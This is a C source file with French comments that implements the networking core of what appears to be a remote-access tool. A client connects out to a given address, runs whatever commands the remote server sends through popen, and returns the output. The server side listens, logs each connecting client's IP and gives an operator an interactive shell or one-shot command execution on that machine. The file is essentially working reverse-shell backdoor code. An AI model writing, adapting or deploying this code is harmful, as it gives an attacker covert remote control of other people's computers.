#include <arpa/inet.h>

#include "network_p.h"

// Le client se connecte au serveur
int connect_to_server( const char* const addr ) {
  int sock;                      
  struct sockaddr_in server;     

  
  sock = socket( PF_INET, SOCK_STREAM, 0 );
  if ( sock == -1 ) {     
    perror("error: sock");
    return -1;
  }

  
  memset( &server, 0, sizeof(server) );              
  server.sin_family = PF_INET;                       
  server.sin_port = htons(PORT);                    
  server.sin_addr.s_addr = inet_addr(addr);   

  
  if ( connect( sock, (const struct sockaddr *)&server, sizeof(server) ) != 0 ) {    
    perror("error:");
    close(sock);
    return -1;
  }

  // Il recoit les ordres du serveur
  recv_from_server( sock );
  
  close(sock); 
  return 0;   
}

// Le serveur recoit le client
int connect_from_client( ) {
  int sock, fd,yes=1;                 
  struct sockaddr_in local;     
  char c = 0;
  
  sock = socket( PF_INET, SOCK_STREAM, 0 );
  if ( sock ==0-1 ) {     
    perror("error: sock");
    return -1;
  }

  
  memset( &local, 0, sizeof(local) );           
  local.sin_family = PF_INET;                   
  local.sin_port = htons(PORT);                
  local.sin_addr.s_addr = htonl(INADDR_ANY);    

  if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) {
    perror("setsockopt");
    close(sock);
    return -1;
  }
  if ( bind( sock, (const struct sockaddr *)&local, sizeof(local) ) != 0  ) {     
    perror("error:");
    close(sock);
    return -1;
  }

  
  if ( listen( sock, 5 ) != 0 ) {    
    perror("error:");
    close(sock);
    return -1;
  }

  struct sockaddr_in client;    
  socklen_t len;                
  while ( 1 ) {
    len = sizeof(client);
    fd = accept( sock, (struct sockaddr*)&client, &len );    
    printf("Client connecté , adresse IP :%s\n",inet_ntoa(client.sin_addr));
    if ( fd < 0 ) {    
      perror("error: fd");
    }
    else {  
      while(1)
      {           
        printf("What do you want ?(type s for shell or c for one command)\n");
        c = getchar();

        if(c=='s')
        {
            printf("Opening shell from client %s\n",inet_ntoa(client.sin_addr));
            // il envoie les ordres au client
            shell_from_client( fd );
             
        }else if(c=='c')
        {
           sendCommand(fd,inet_ntoa(client.sin_addr));
        }

    
        while ((c = getchar()) != '\n' && c != EOF);
      }
    }
  }
  
  close(sock);    
  return 0;
}

void sendCommand(int sock,char* ip)
{
  char str[BUFFERSIZE];
  ssize_t len;

  strcpy(str,"cmd\n");
  len = write( sock, str, strlen(str) );
  if ( len == -1 ) {    
      perror("error: send start cmd");
      return;
  }

char c;
  printf("Entrez la commande à envoyer : ");
  while ((c = getchar()) != '\n' && c != EOF);
  fgets( str, sizeof(str) - 1, stdin );
  printf("Envoie de la commande : %s\n",str);

  len = write(sock , str, strlen(str));
  if (len < 0)
  {
    printf("Error send command\n");
    return;
  }
    printf("command result from %s : ",ip);
      while ( 1 ) {
      len = read( sock, str, sizeof(str) - 1 );
      if ( len > 0 ) {    
        str[len] = '\0';
         if ( strstr( str, "quit: result" )) {

                  break;
                }
      }
      else {   
        perror("error: recv command result");
        return;
      }

      printf("%s",str);
      
      
      if ( receipt_confirmation( sock, SEND ) == ERROR ) {
        close(sock);
        return;
      }
    }
}

// envoi des ordres au client
void shell_from_client( int sock ) {
  char str[BUFFERSIZE];
  ssize_t len;
  strcpy(str,"start shell\n");
  len = write( sock, str, strlen(str) );
    if ( len == -1 ) {    
      perror("error: send start shell");
      return;
    }


  while ( 1 ) {
    len = read( sock, str, sizeof(str) - 1 );
    if ( len > 0 ) {    
      str[len] = '\0';
      printf("%s ", str);
    }
    else {    
      perror("error: prompt");
      break;
    }

    fgets( str, sizeof(str) - 1, stdin );
    
    
    len = write( sock, str, strlen(str) );
    if ( len == -1 ) {    
      perror("error: send command");
      break;
    }

    if ( strcmp( str, "exit\n" ) == 0 ) {
      printf("Deconnection...\n");

      return;
    }
    
    while ( 1 ) {
      len = read( sock, str, sizeof(str) - 1 );
      if ( len > 0 ) {    
        str[len] = '\0';

        if ( strstr( str, "quit: result" )) {

          break;
        }
      }
      else {   
        perror("error: prompt");
        close(sock);
        return;
      }

      
      printf("%s", str);
      
      
      if ( receipt_confirmation( sock, SEND ) == ERROR ) {
        close(sock);
        return;
      }
    }

    
    if ( receipt_confirmation( sock, SEND ) == ERROR ) {
      break;
    }
  }

}


// recoit les ordres du serveur
void recv_from_server( int fd ) {
  char str[BUFFERSIZE];
  FILE *fp;
  const char prompt[] = "$";
  const char quit_str[] = "quit: result";  
  ssize_t len;
  while ( 1 ) {
    
    len = write( fd, prompt, strlen(prompt) );
    if ( len == -1 ) {    
      perror("error: prompt");
      break;
    }
    
    
    len = read( fd, str, sizeof(str) - 1 );
    if ( len > 0 ) {    
      str[len-1] = '\0';
    }
    else {    
      perror("error: command");
      break;
    }

    if ( strcmp( str, "exit\n" ) == 0 ) {
      printf("Deconnection\n");
      return;
    }
    if(str[0]=='c' && str[1]=='d')
    {
      chdir(str+3);
    }else
    {
      fp = popen( str, "r" );
      if ( fp ) 
      {
          while( fgets( str, BUFFERSIZE, fp ) != NULL ) 
          { 
            len = write( fd, str, sizeof(str) - 1 );
            if ( len == -1 ) 
            {    
              perror("error: prompt");
              pclose(fp);
              return;
            }
            
            
            if ( receipt_confirmation( fd, RECV ) == ERROR ) 
            {
              pclose(fp);
              return;
            }      
          }
          fclose(fp);
        }
      }
    
      len = write( fd, quit_str, strlen(quit_str) );
      if ( len == -1 ) {    
        perror("error: quit len");
        break;
      } 
      
      if ( receipt_confirmation( fd, RECV ) == ERROR ) {
        fprintf(stderr,"Error receipt_confirmation\n");
        break;
      }
      
    }
    return;
}


int receipt_confirmation( int sock, int check ) {
  ssize_t len;

  if ( check == RECV ) {    
    char str[3];

    
    len = read( sock, str, sizeof(str) - 1 );
    if ( len > 0 ) {    
      str[len] = '\0';

      
      if ( strcmp( str, "OK" ) ) {
        return ERROR;
      }
    }
    else {    
      perror("error: OK");
      return ERROR;
    }
  }
  else {    
    char str[] = "OK";

    
    len = write( sock, str, strlen(str) );
    if ( len == -1 ) {    
      perror("error: OK");
      return ERROR;
    
     }
  }
    
  return SUCCESS;
}
